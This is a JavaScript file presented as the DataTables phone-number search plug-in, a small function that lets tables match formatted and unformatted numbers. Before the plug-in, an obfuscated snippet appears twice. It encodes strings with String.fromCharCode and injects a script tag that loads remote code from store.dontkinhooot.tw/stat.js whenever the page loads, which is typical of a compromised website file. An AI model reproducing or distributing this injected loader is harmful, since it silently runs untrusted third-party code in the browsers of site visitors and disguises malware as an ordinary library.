Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Telephone numbers are a common data point to display in HTML tables, and are
 * often formatted (e.g. `dt-string 555-1234`). Typically, when searching a
 * table a user would need to enter the number in exactly the same format it is
 * displayed in, but this is not always convenient (e.g. you might search for
 * `dt-string 5551`).
 *
 * This filtering plug-in will allow both forms to be matched be providing both
 * the formatted and de-formatted data to the table's search.
 * 
 *  @summary Make phone numbers searchable formatted or unformatted
 *  @name Phone number
 *  @author Allan Jardine
 *
 *  @example
 *    $(document).ready(function() {
 *      $('#example').dataTable( {
 *        columnDefs: [
 *          { type: 'phoneNumber', target: 4 }
 *        ]
 *      } );
 *    } );
 */

jQuery.fn.DataTable.ext.type.search.phoneNumber = function ( data ) {
    return ! data ?
        '' :
        typeof data === 'string' ?
            data + data.replace(/[ \-]/g, '') :
            data;
};
